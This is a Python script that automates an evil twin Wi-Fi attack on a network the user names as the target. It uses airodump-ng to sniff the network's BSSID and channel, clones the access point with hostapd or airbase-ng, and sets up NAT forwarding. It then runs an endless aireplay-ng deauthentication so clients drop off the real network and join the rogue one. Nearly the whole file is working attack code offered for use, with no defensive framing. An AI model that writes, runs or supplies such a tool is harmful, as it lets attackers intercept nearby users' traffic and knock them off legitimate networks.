#!/usr/bin/env python

import os
import subprocess
from time import sleep
from threading import Timer
import csv

def initial_setup(adapter):
    os.system("airmon-ng check kill")
    os.system("/etc/init.d/avahi-daemon stop")
    os.system("ifconfig %s down" %adapter)
    os.system("iwconfig %s txpower 30" %adapter)
    os.system("airmon-ng start %s" %adapter)
    cmd = "ifconfig | grep mon | awk -F: '{print $1}'"
    int_name = str(os.popen(cmd).read()).strip('\n')
    return int_name

def kill(p):
    try:
        p.kill()
    except OSError:
        pass

def network_sniff(interface_name, essid):
    cmd = "airodump-ng -w tmpcap -o csv -N '" + essid + "' --write-interval 1 " + interface_name
    # os.spawnlp(os.P_WAIT, cmd)
    #os.system(cmd)
    p = subprocess.Popen("exec " + cmd, shell=True)
    t = Timer(10, kill, [p])
    t.start()
    p.wait()
    t.cancel()
    # extract bssid, channel
    bssid = str(os.popen("cat tmpcap-01.csv | grep '" + essid + "' | awk '{print $1}' | awk -F',' 'NR==1{print $1}'").read()).strip(',').strip('\n')
    channel = str(os.popen("cat tmpcap-01.csv | grep '" + essid + "' | awk '{print $6}' | awk -F',' 'NR==1{print $1}'").read()).strip(',').strip('\n')
    print("GOT BSSID AND CHANNEL\n")
    print("BSSID: " + bssid)
    print("CHANNEL: " + channel)
    return bssid, channel

def clone_ap(interface, essid, channel, wpa_pass = None):
    os.system("killall dnsmasq")
    if wpa_pass and len(wpa_pass) > 0:
        # start dnsmasq
        os.system("dnsmasq -C dnsmasq.conf -i %s" %interface)
        # create hostapd conf
        os.system("rm hostapd.conf")
        os.system("touch hostapd.conf")
        os.system("echo 'interface=%s' >> hostapd.conf" %interface)
        os.system("echo 'driver=nl80211' >> hostapd.conf")
        os.system("echo 'ssid=%s' >> hostapd.conf" %essid)
        os.system("echo 'hw_mode=g' >> hostapd.conf")
        os.system("echo 'channel=%s' >> hostapd.conf" %channel)
        os.system("echo 'macaddr_acl=0' >> hostapd.conf")
        os.system("echo 'ignore_broadcast_ssid=0' >> hostapd.conf")
        os.system("echo 'auth_algs=1' >> hostapd.conf")
        os.system("echo 'wpa=2' >> hostapd.conf")
        os.system("echo 'wpa_passphrase=%s' >> hostapd.conf" %wpa_pass)
        os.system("echo 'wpa_key_mgmt=WPA-PSK' >> hostapd.conf")
        os.system("echo 'wpa_pairwise=CCMP' >> hostapd.conf")
        os.system("echo 'wpa_group_rekey=86400' >> hostapd.conf")
        os.system("echo 'ieee80211n=1' >> hostapd.conf")
        os.system("echo 'wme_enabled=1' >> hostapd.conf")

        # config internet forwarding
        os.system("ifconfig %s 10.0.0.1 netmask 255.255.255.0" %interface)
        os.system("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
        os.system("iptables --append FORWARD --in-interface %s -j ACCEPT" %interface)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        input("In a second terminal window please execute the command 'hostapd hostapd.conf' then hit enter to continue \n")
        return
    else: 
        # start dnsmasq
        os.system("dnsmasq -C dnsmasq.conf -i at0")
        cmd = "airbase-ng -e '" + essid + "' -c " + channel + " " + interface
        input("In a second terminal window please execute the command '%s' then hit enter to continue \n" %cmd)
        # config internet forwarding
        os.system("ifconfig at0 up")
        os.system("ifconfig at0 10.0.0.1 netmask 255.255.255.0")
        os.system("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")
        os.system("iptables -P FORWARD ACCEPT")
        os.system("iptables -t nat -A POSTROUTING -o %s -j MASQUERADE" %interface)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        return



def deauth_all_users(essid, bssid, channel, inter): 
    os.system("aireplay-ng --deauth 0 -a " + bssid + " " + inter + " --ignore-negative-one")

if __name__ == "__main__":
    os.system("rm tmpcap*")
    interface_name = input("Please enter your wireless interface name (e.g. wlan0) ")
    network_name = input("Please enter the target network name (case sensitive) ")
    int_name = initial_setup(interface_name)

    bssid, channel = network_sniff(int_name, network_name)
    wpa_pass = input("If you would like to clone a wpa network with a known password please enter it \n")
    clone_ap(int_name, network_name, channel, wpa_pass)
    print("Deauthing")
    deauth_all_users(network_name, bssid, channel, int_name)
    print("Done")
